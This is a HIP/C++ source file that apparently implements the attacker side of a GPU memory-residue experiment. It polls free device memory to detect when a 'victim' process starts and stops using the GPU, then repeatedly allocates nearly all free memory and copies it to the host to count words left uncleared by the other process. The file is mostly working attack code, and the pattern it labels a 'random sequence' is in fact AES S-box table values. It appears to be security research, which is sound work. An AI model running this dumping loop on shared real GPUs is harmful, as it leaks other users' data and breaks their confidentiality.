
#include <algorithm>
#include <cassert>
#include <cstdlib>
#include <iostream>
#include <iterator>
#include <vector>

#include <hip/hip_runtime.h>
#include <hip/hip_runtime_api.h>

#include <thread>

#include <unistd.h>

using std::begin;
using std::copy;
using std::end;
using std::generate;
using std::vector;

#define cuda_try(call)                                                                \
  do {                                                                                \
    hipError_t err = static_cast<hipError_t>(call);                                 \
    if (err != hipSuccess) {                                                         \
      printf("CUDA error at %s %d: %s\n", __FILE__, __LINE__, hipGetErrorName(err)); \
      std::terminate();                                                               \
    }                                                                                 \
  } while (0)

__global__ void extractSharedMem(uint32_t *d_a, size_t num_elements) {
  // Calculate global thread ID
  int tid = (blockIdx.x * blockDim.x) + threadIdx.x;
  __shared__ uint32_t shared_mem[1024];

  if (tid < num_elements) {
    d_a[tid] = shared_mem[threadIdx.x];
  }
  
}

hipDevice_t get_cuda_device(const int device_id, int& sms_count) {
  hipDevice_t device;
  int device_count = 0;

  cuda_try(hipInit(0));  // Flag parameter must be zero
  cuda_try(hipGetDeviceCount(&device_count));

  if (device_count == 0) {
    std::cout << "No CUDA capable device found." << std::endl;
    std::terminate();
  }

  cuda_try(hipDeviceGet(&device, device_id));

  hipDeviceProp_t device_prop;
  hipGetDeviceProperties(&device_prop, device_id);

  sms_count = device_prop.multiProcessorCount;

  std::cout << "Device[" << device_id << "]: " << device_prop.name << '\n';
  std::cout << "SMs count: " << sms_count << '\n';
  std::cout << "Total amount of global memory: " << device_prop.totalGlobalMem << ", " << device_prop.totalGlobalMem / 1048576.0f << " MBytes \n";

  return device;
}

// a 1024-bit random sequence
unsigned int uniq_key[32] = {
        0x63636363U, 0x7c7c7c7cU, 0x77777777U, 0x7b7b7b7bU,
        0xf2f2f2f2U, 0x6b6b6b6bU, 0x6f6f6f6fU, 0xc5c5c5c5U,
        0x30303030U, 0x01010101U, 0x67676767U, 0x2b2b2b2bU,
        0xfefefefeU, 0xd7d7d7d7U, 0xababababU, 0x76767676U,
        0x239c9cbfU, 0x53a4a4f7U, 0xe4727296U, 0x9bc0c05bU,
        0x75b7b7c2U, 0xe1fdfd1cU, 0x3d9393aeU, 0x4c26266aU,
        0x6c36365aU, 0x7e3f3f41U, 0xf5f7f702U, 0x83cccc4fU,
        0x6834345cU, 0x51a5a5f4U, 0xd1e5e534U, 0xf9f1f108U
};

int main() {
  int device_id = 0;
  int sms_count = 0;
  hipDevice_t dev = get_cuda_device(device_id, sms_count);

  size_t total_memsize, available_memsize;

  hipMemGetInfo(&available_memsize, &total_memsize);
  size_t attacker_base_usage = total_memsize - available_memsize;
  std::cout << "Attacker base memory usage: " << attacker_base_usage << ", " << attacker_base_usage / 1048576.0f << " MBytes \n";

  size_t memsize = available_memsize - 65273856;
  
  /*uint32_t *a;
  a = (uint32_t*)malloc(memsize);

  size_t num_elements = memsize / 4;
  std::cout << "Number of elements in a: " << num_elements / 4 << "\n";

  unsigned int *d_a;*/

  /*for (size_t i = 0; i < memsize/4; i += 32) {
		for (size_t j = 0; j < 32; ++j) {
			a[i+j] = uniq_key[j];
		}
	} 

  cuda_try(cudaMalloc(&d_a, memsize));
  cuda_try(cudaMemcpy(d_a, a, memsize, cudaMemcpyHostToDevice)); // fill GPU memory with a predefined value
	cuda_try(cudaFree(d_a)); // deallocate it!!
*/
  size_t victim_usage = 0;

  // Victim Detection System
  while (true) {
    // Based on available global memory in GPU, determine if victim has allocated memory in GPU
    hipMemGetInfo(&available_memsize, &total_memsize);
    std::cout << "Available Memory: " << available_memsize << ", " << available_memsize / 1048576.0f << " MBytes"; 

    if(available_memsize + attacker_base_usage != total_memsize) {
      victim_usage = total_memsize - attacker_base_usage - available_memsize;
      std::cout << " <-- Victim is here!\n";
      break;
    }
    std::cout << "\n";
    usleep(100000); // 0.1 seconds
  }

  // Victim Exit System
  uint32_t *a;
  a = (uint32_t*)malloc(memsize);
  uint32_t *d_a;
  while (true) {
    // Based on available global memory in GPU, determine if victim has finished using memory in GPU
    hipMemGetInfo(&available_memsize, &total_memsize);
    std::cout << "Available Memory: " << available_memsize << ", " << available_memsize / 1048576.0f << " MBytes"; 

    if (total_memsize - attacker_base_usage - available_memsize > victim_usage) {
      victim_usage = total_memsize - attacker_base_usage - available_memsize;
    }

    if(available_memsize + attacker_base_usage == total_memsize) {
      std::cout << " <-- Victim is gone!\n";
      std::cout << "  Victim Maximum Memory Usage: " << victim_usage << ", " << victim_usage / 1048576.0f << " MBytes\n"; 
      break;
    }
    std::cout << "\n";

    if (hipMalloc(&d_a, memsize) == hipSuccess) {
       std::cout << "Dumping out GPU Memory..\n";
      cuda_try(hipMemcpy(a, d_a, memsize, hipMemcpyDeviceToHost));

      size_t num_uncleared = 0;
      size_t num_zero = 0;
      size_t num_others = 0;
      std::cout << "Checking outputs\n";

      for (size_t i = 0; i < memsize / 4; i+= 32) {
        for (size_t j = 0; j < 32; ++j) {
          if(a[i+j] == uniq_key[j]) {
            num_uncleared++;
          }
          else if(a[i+j] == 0) {
            num_zero++;
          }
          else {
            num_others++;
          }
        }
      }

      std::cout << "Number of uncleared memory: " << num_uncleared << "\n";
      std::cout << "Number of zeros: " << num_zero << "\n";
      std::cout << "Number of others: " << num_others << "\n";
    }

    usleep(100000); // 0.1 seconds
  }

  // Dump out GPU memory
  /*std::cout << "Dumping out GPU Memory..\n";
  uint32_t *a;
  a = (uint32_t*)malloc(memsize);
  uint32_t *d_a;
  cuda_try(cudaMalloc(&d_a, memsize));

  cuda_try(cudaMemcpy(a, d_a, memsize, cudaMemcpyDeviceToHost));

  size_t num_uncleared = 0;
  size_t num_zero = 0;
  size_t num_others = 0;

  std::cout << "Checking outputs\n";

  for (size_t i = 0; i < memsize / 4; i+= 32) {
    for (size_t j = 0; j < 32; ++j) {
			if(a[i+j] == uniq_key[j]) {
        num_uncleared++;
      }
      else if(a[i+j] == 0) {
        num_zero++;
      }
      else {
        num_others++;
      }
		}
  }

  std::cout << "Number of uncleared memory: " << num_uncleared << "\n";
  std::cout << "Number of zeros: " << num_zero << "\n";
  std::cout << "Number of others: " << num_others << "\n";*/

}